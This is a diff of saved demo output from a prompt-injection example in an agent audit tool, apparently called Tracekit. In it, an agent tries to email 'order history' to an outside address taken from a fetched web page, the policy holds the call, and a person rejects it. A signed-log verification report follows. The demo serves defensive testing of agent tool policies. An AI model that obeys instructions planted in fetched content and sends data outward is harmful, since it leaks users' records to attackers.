@@ -1,33 +1,39 @@
 $ python examples/v2/demos/prompt_injection.py
+tracekit: the signer's http setting(s) are experimental: they work and are tested, but may change (https://github.com/Cygnux-Labs/Tracekit/wiki/Support)
 send_email held by TK-P001; the person at the terminal looks and says no:
-$ tracekit approvals show apr-4d6d2e155aedadda2555fd1a75eac269
-approval    apr-4d6d2e155aedadda2555fd1a75eac269 (requested)
+$ tracekit approvals show apr-7dc1d74e0f0afff9769e7a548d031d7f
+approval    apr-7dc1d74e0f0afff9769e7a548d031d7f (requested)
 tool        "send_email"
+why         not on this machine: `tracekit policy compile <file>` prints the reasons of the signer's policy, sha256:c39030eb62da80327df0f911dad14a9a955aca745157cbd9f2a5dc6af6789e1e
+expires     2026-11-19T09:39:37.813366Z (in 59 min)
+answer      `tracekit approvals --signer $TMP/tk-tuwdt_lr/s.sock approve apr-7dc1d74e0f0afff9769e7a548d031d7f` to allow it once, `tracekit approvals --signer $TMP/tk-tuwdt_lr/s.sock reject apr-7dc1d74e0f0afff9769e7a548d031d7f` to refuse it
+record      tracekit view --approval apr-7dc1d74e0f0afff9769e7a548d031d7f (with the --config or --data-dir of this signer)
+a false alarm? tracekit feedback --harmless apr-7dc1d74e0f0afff9769e7a548d031d7f --signer $TMP/tk-tuwdt_lr/s.sock
 rules       TK-P001
-policy      sha256:04e94be79ec2f99a8bea0aadff765ffc112e4b515f048abd8830630520226ada
+policy      sha256:c39030eb62da80327df0f911dad14a9a955aca745157cbd9f2a5dc6af6789e1e
 requester   "token:agent"
-run         aaa37c704f5fbbcec8275cd6b8280273
-call        call-f71b6a9d attempt 0
-expires     2026-10-12T11:10:59.518990Z
-binding     sha256:2aef020f2e7813d6254d28e5b91603042d47fd0a1938739a6c0f89dd721919b9
+run         6f15f758d8987fcfe5501eacb7f09507
+call        call-8110e816 attempt 0
+binding     sha256:a67c48195a00c809c5a5ce960a60a9b2419edfb3b5b78b11d6cb3d81ce64e0c6
 arguments (the signer's copy, in full):
 {
   "body": "order history",
   "to": "records@offsite.example"
 }
-$ tracekit approvals reject apr-4d6d2e155aedadda2555fd1a75eac269 --reason 'the address came from the fetched page'
-rejected: apr-4d6d2e155aedadda2555fd1a75eac269
-send_email: Tool call blocked by policy: TK-APPROVAL-REJECTED: not approved (state=rejected)
+$ tracekit approvals reject apr-7dc1d74e0f0afff9769e7a548d031d7f --reason 'the address came from the fetched page'
+rejected: apr-7dc1d74e0f0afff9769e7a548d031d7f
+send_email: Tool call blocked by policy: TK-APPROVAL-REJECTED (approval apr-7dc1d74e0f0afff9769e7a548d031d7f): not approved (state=rejected)
 agent: Garden tools are 20% off until May, and it is sunny in Lisbon.
 
-$ tracekit verify aaa37c704f5fbbcec8275cd6b8280273.tkb --trust trust.json --detail
+$ tracekit verify 6f15f758d8987fcfe5501eacb7f09507.tkb --trust trust.json --detail
 [PASS] manifest — every file is listed with its SHA-256 and nothing else is in the bundle
-[PASS] checkpoint — tracekit.local/8e68ae24f0e8902ef59a8c6733596128 at tree size 28, signed by its pinned log key
+[PASS] checkpoint — tracekit.local/k8cb48a851d5086a49bbe6886427425f57ff97d24147dac5a86b50a3157d1a02c at tree size 28, signed by its pinned log key
 [PASS] witness quorum — 0 pinned cosignature(s), 0 required
 [PASS] keys — 1 record key(s) from 1 key record(s)
 [PASS] signatures — 27 record(s), keys valid at their position
-[PASS] run chain — run 'aaa37c704f5fbbcec8275cd6b8280273' of tenant 'default', contiguous from run_seq 0
+[PASS] run chain — run '6f15f758d8987fcfe5501eacb7f09507' of tenant 'default', contiguous from run_seq 0
 [PASS] inclusion — first and last records of 1 run(s) are in the checkpointed tree of size 28
+[PASS] policy snapshot — policies/c39030eb62da80327df0f911dad14a9a955aca745157cbd9f2a5dc6af6789e1e.json
 [PASS] coverage — layers L1+L2 (L3 absent); 0 call(s) reconciled; unreconciled: none
 [PASS] coverage matrix — model calls not covered, tool calls reported (adapter), network not covered, processes not covered, services not covered
 [PASS] tiers — 3 tool call(s): T1 0, T2 0, T3 0, untiered 3
@@ -37,13 +43,13 @@ $ tracekit verify aaa37c704f5fbbcec8275cd6b8280273.tkb --trust trust.json --deta
 [PASS] key assurance — asserted: the log declares its record keys; none is attested
 
 Integrity: VERIFIED.
-Assurance: dev; records ed25519; checkpoint Ed25519 only (tracekit.local/8e68ae24f0e8902ef59a8c6733596128); no witness cosignature; key retirements not proven complete.
+Assurance: dev; records ed25519; checkpoint Ed25519 only (tracekit.local/k8cb48a851d5086a49bbe6886427425f57ff97d24147dac5a86b50a3157d1a02c); no witness cosignature; key retirements not proven complete.
 
 the signed decision, approval and outcome of send_email:
-  #2 policy.decision {"decision": "flag", "rule_ids": ["TK-F012"], "tool": "fetch_page", "tool_use_id": "call-482df586"}
-  #4 policy.decision {"decision": "allow", "rule_ids": [], "tool": "get_weather", "tool_use_id": "call-31811339"}
-  #6 tool.result {"ok": true, "tool_use_id": "call-482df586"}
-  #8 tool.result {"ok": true, "tool_use_id": "call-31811339"}
-  #10 policy.decision {"decision": "ask", "provenance": [{"field": "to", "kind": "email", "source": {"run_seq": 6, "tool": "fetch_page", "tool_call_id": "call-482df586"}}], "provenance_state": "complete", "rule_ids": ["TK-P001"], "tool": "send_email", "tool_use_id": "call-f71b6a9d"}
-  #17 approval {"approval_id": "apr-4d6d2e155aedadda2555fd1a75eac269", "approver": "uid:501", "decision": "reject", "person": "alice", "reason": "the address came from the fetched page", "self_approved": false, "tool_use_id": "call-f71b6a9d"}
-  #19 policy.decision {"decision": "ask", "provenance": [{"field": "to", "kind": "email", "source": {"run_seq": 6, "tool": "fetch_page", "tool_call_id": "call-482df586"}}], "provenance_state": "complete", "rule_ids": ["TK-P001"], "tool": "send_email", "tool_use_id": "call-f71b6a9d"}
+  #2 policy.decision {"decision": "flag", "rule_ids": ["TK-F012"], "tool": "fetch_page", "tool_use_id": "call-d89bf9d6"}
+  #4 policy.decision {"decision": "allow", "rule_ids": [], "tool": "get_weather", "tool_use_id": "call-f667b834"}
+  #8 tool.result {"ok": true, "tool_use_id": "call-d89bf9d6"}
+  #9 tool.result {"ok": true, "tool_use_id": "call-f667b834"}
+  #12 policy.decision {"decision": "ask", "provenance": [{"field": "to", "kind": "email", "source": {"run_seq": 8, "tool": "fetch_page", "tool_call_id": "call-d89bf9d6"}}], "provenance_state": "complete", "rule_ids": ["TK-P001"], "tool": "send_email", "tool_use_id": "call-8110e816"}
+  #17 approval {"approval_id": "apr-7dc1d74e0f0afff9769e7a548d031d7f", "approver": "uid:501", "decision": "reject", "person": "alice", "reason": "the address came from the fetched page", "self_approved": false, "tool_use_id": "call-8110e816"}
+  #19 policy.decision {"decision": "ask", "provenance": [{"field": "to", "kind": "email", "source": {"run_seq": 8, "tool": "fetch_page", "tool_call_id": "call-d89bf9d6"}}], "provenance_state": "complete", "rule_ids": ["TK-P001"], "tool": "send_email", "tool_use_id": "call-8110e816"}
